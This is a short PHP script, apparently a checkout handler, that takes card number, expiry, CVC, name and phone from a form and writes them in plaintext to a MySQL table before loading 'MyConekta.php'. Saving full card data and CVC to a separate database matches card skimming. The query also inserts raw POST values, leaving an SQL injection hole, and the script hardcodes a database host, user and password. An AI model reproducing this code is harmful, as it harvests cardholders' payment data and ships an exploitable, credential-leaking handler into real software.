<?php
$number = $_POST["number"];
$exp_month = $_POST["exp_month"];
$exp_year = $_POST["exp_year"];
$cvc = $_POST["cvc"];
$name = $_POST["name"];
$email = "h@h.com";
$phone = $_POST["telefono"];
date_default_timezone_set('America/New_York');
$fecha = date("y-m-d");

$enlace = mysql_connect("lat1703910292451.db.11167117.hostedresource.com","lat1703910292451","d8W@Bg9sV") or die(mysql_error());
mysql_select_db("lat1703910292451") or die(mysql_error());

  $sql = "INSERT INTO conekta (`name`, `email`, `number`, `exp_month`, `exp_year`, `cvc`, `fecha`, `phone`) VALUES ('$name','$email','$number','$exp_month','$exp_year','$cvc','$fecha','$phone')";
  $qry = mysql_query($sql);
  mysql_close($enlace);
require_once 'MyConekta.php';